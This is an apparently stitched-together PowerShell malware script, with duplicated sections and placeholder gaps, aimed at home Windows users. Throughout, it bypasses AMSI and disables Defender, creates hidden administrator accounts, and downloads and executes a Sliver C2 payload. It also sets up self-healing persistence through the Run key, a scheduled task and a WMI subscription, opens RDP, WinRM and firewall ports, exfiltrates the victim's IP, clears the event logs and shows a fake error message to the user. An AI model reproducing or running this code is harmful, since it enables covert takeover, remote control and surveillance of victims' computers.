# Run as Administrator (UAC bypass assumed)
# Target: Home users with default Windows Defender

# =============================================
# 0. Defense Evasion & Environmental Checks
# =============================================

# Bypass AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)


# =============================================
# 1. Windows Defender Management
# =============================================

$defenderOriginalState = (Get-MpPreference).DisableRealtimeMonitoring
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

# Path exclusion for C:\
if (-not ((Get-MpPreference).ExclusionPath -contains "C:\")) {
    Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
}

# Process exclusions for all PowerShell versions
$psProcesses = @("powershell.exe", "powershell_ise.exe", "pwsh.exe")
$currentExclusions = (Get-MpPreference).ExclusionProcess
foreach ($process in $psProcesses) {
    if (-not ($currentExclusions -contains $process)) {
        Add-MpPreference -ExclusionProcess $process -ErrorAction SilentlyContinue
    }
}

# =============================================
# 2. Hidden User Creation
# =============================================
# ... [rest of script unchanged] ...



# =============================================
# 2. Hidden User Creation
# =============================================

$usersToCreate = @("svc_PrintSpooler", "svc_TaskScheduler")  # Camouflaged usernames
foreach ($user in $usersToCreate) {
    if (-not (Get-LocalUser -Name $user -ErrorAction SilentlyContinue)) {
        $password = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force
        New-LocalUser -Name $user -Password $password -FullName "Windows System Service" -Description "System component" -ErrorAction SilentlyContinue
        Add-LocalGroupMember -Group "Administrators" -Member $user -ErrorAction SilentlyContinue
        
        # Hide from login screen
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force }
        Set-ItemProperty -Path $regPath -Name $user -Value 0 -Type DWord
    }
}

# =============================================
# 3. Payload Execution with Cleanup Logic
# =============================================

$sliverC2Url = "http://your-sliver-server.com:80/payload.b64"
$encodedPayload = (Invoke-WebRequest -Uri $sliverC2Url -UseBasicParsing).Content
$decodedPayload = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload))

$enhancedPayload = $decodedPayload + @"
# --- Start Enhanced Logic ---
try {
    `$mtx = New-Object System.Threading.Mutex(`$false, "Global\SliverActiveSession")
    if (`$mtx.WaitOne(0)) {
        # AV check
        try { 
            `$testFile = [System.IO.Path]::GetTempFileName()
            [System.IO.File]::WriteAllText(`$testFile, "test")
            Remove-Item `$testFile -Force
            `$avDetected = `$false
        } catch { `$avDetected = `$true }

        # C2 check
        `$connected = try { (Invoke-WebRequest -Uri "http://your-sliver-server.com:80/heartbeat" -TimeoutSec 5).StatusCode -eq 200 } catch { `$false }

        if (`$connected -and -not `$avDetected) {
            # Cleanup old instances
            Get-CimInstance Win32_Process | Where-Object { 
                `$_.CommandLine -match "update.ps1" -and 
                `$_.ProcessId -ne `$PID -and
                (Test-Path "HKLM:\SOFTWARE\SliverSessionActive")
            } | ForEach-Object { Stop-Process -Id `$_.ProcessId -Force }
            
            Set-ItemProperty -Path "HKLM:\SOFTWARE" -Name "SliverSessionActive" -Value 1 -Force
        } else {
            # Cleanup persistence on failure
            Remove-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsAudioService" -ErrorAction SilentlyContinue
            Unregister-ScheduledTask -TaskName "WindowsAudioServiceMonitor" -Confirm:`$false
        }
    }
} finally {
    if (`$mtx) { `$mtx.ReleaseMutex() }
}
# --- End Enhanced Logic ---
"@

Invoke-Expression $enhancedPayload

# =============================================
# 4. Self-Healing Persistence
# =============================================

# Registry
$registryValue = "powershell.exe -WindowStyle Hidden -Command `"& { iwr http://your-sliver-server.com:80/update.ps1 | iex }`""
if ((Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsAudioService" -ErrorAction SilentlyContinue).WindowsAudioService -ne $registryValue) {
    Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsAudioService" -Value $registryValue
}

# Scheduled Task
if (-not (Get-ScheduledTask -TaskName "WindowsAudioServiceMonitor" -ErrorAction SilentlyContinue)) {
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iwr http://your-sliver-server.com:80/update.ps1 | iex`""
    $trigger = New-ScheduledTaskTrigger -AtStartup
    Register-ScheduledTask -TaskName "WindowsAudioServiceMonitor" -Action $action -Trigger $trigger -User "SYSTEM" -Force
}

# WMI Subscription (existing implementation)
# ... [Insert WMI code from previous versions] ...

 =============================================
# 4. Self-Healing Persistence
# =============================================

# ... [Registry and Scheduled Task code] ...

# --- WMI Event Subscription (Conditional Creation) ---
$wmiFilterName = "WindowsUpdateFilter"
$wmiConsumerName = "WindowsUpdateConsumer"

# Create filter if missing
if (-not (Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$wmiFilterName'" -ErrorAction SilentlyContinue)) {
    $filterArgs = @{
        Name = $wmiFilterName
        EventNameSpace = 'root\CIMv2'
        QueryLanguage = 'WQL'
        Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    }
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
}

# Create consumer if missing
if (-not (Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$wmiConsumerName'" -ErrorAction SilentlyContinue)) {
    $consumerArgs = @{
        Name = $wmiConsumerName
        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command `"& { iwr http://your-sliver-server.com:80/update.ps1 | iex }`""
    }
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
}

# Create binding if missing
if (-not (Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -Filter "Filter.Name='$wmiFilterName'" -ErrorAction SilentlyContinue)) {
    $binding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter = $filter
        Consumer = $consumer
    }
}

# =============================================
# 5. Conditional Remote Access Setup
# =============================================

# WinRM
if (-not (Get-PSSessionConfiguration -Name Microsoft.PowerShell -ErrorAction SilentlyContinue)) {
    Enable-PSRemoting -Force
    Set-NetFirewallRule -Name "WINRM-HTTP-In-TCP","WINRM-HTTPS-In-TCP" -RemoteAddress Any
}

# RDP
if ((Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -ne 0) {
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
}

# Ports
$ports = @(3389, 5985, 5986, 445, 8080)
foreach ($port in $ports) {
    if (-not (Get-NetFirewallRule -DisplayName "Allow Port $port" -ErrorAction SilentlyContinue)) {
        New-NetFirewallRule -DisplayName "Allow Port $port" -Direction Inbound -Action Allow -Protocol TCP -LocalPort $port
    }
}

# =============================================
# 6. One-Time Exfiltration
# =============================================

if (-not (Test-Path "HKLM:\SOFTWARE\SliverExfilCompleted")) {
    $ip = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
    Invoke-WebRequest -Uri "http://$ip.log.your-sliver-server.com" -UseBasicParsing -ErrorAction SilentlyContinue
    New-ItemProperty -Path "HKLM:\SOFTWARE" -Name "SliverExfilCompleted" -Value 1 -Force
}

# =============================================
# 7. Cleanup & Restoration
# =============================================

# Restore Defender
Set-MpPreference -DisableRealtimeMonitoring $defenderOriginalState -ErrorAction SilentlyContinue

# Anti-forensics
wevtutil cl Security /quiet
wevtutil cl Application /quiet
Get-EventLog -LogName System | Where-Object { $_.EntryType -eq "Error" } | Limit-EventLog -MaximumSize 1KB

# Social engineering
Add-Type -AssemblyName PresentationFramework
[System.Windows.MessageBox]::Show("Audio Service Error: Please restart your computer.", "System Alert", "OK", "Error")



















}